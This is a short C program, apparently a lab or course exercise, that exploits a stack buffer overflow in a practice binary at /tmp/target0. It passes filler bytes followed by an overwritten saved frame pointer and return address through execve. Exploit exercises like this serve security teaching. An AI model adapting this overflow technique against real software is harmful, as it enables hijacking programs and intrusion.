#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target0"

int main(void) {
  char *args[3];
  char *env[1];

  char arg[] = {
      [0 ... 19] = 'A',       // buffer
      0x48, 0xF8, 0xFF, 0xBF, // sfp
      0x15, 0x85, 0x04, 0x08  // ret
  };

  args[0] = TARGET;
  args[1] = arg;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
